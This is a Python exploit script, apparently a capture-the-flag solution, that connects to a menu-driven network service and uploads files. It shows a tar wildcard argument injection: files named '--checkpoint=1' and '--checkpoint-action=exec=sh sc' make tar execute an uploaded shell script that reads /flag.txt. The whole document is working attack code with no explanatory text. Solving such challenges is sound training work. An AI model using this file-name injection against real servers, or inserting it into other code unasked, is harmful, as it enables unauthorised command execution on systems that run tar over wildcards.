#!/usr/bin/env python3

import socket
import time
import sys

if __name__ == '__main__':
    exploit = [
            (b'sc\n', b'#!/usr/bin/env python3\n\ncat /flag.txt\nEOF\n'),
            (b'--checkpoint=1\n', b'42EOF\n'),
            (b'--checkpoint-action=exec=sh sc\n', b'42EOF\n'),
            ]
    if len(sys.argv) != 2:
        print("Usage: ./writeup IP_ADRESS:PORT")
        exit(1)

    host, port = sys.argv[1].split(':');

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, int(port)))

    for exp in exploit:
        time.sleep(0.1)
        data = client.recv(4096).decode('utf-8')
        print(data)
        client.send(b'1\n')
        time.sleep(0.1)
        data = client.recv(4096).decode('utf-8')
        print(data)
        client.send(exp[0])
        time.sleep(0.1)
        data = client.recv(4096).decode('utf-8')
        print(data)
        client.send(exp[1])
    time.sleep(0.1)
    data = client.recv(4096).decode('utf-8')
    print(data)
    client.send(b'5\n')
    time.sleep(0.1)
    data = client.recv(4096).decode('utf-8')
    print(data)
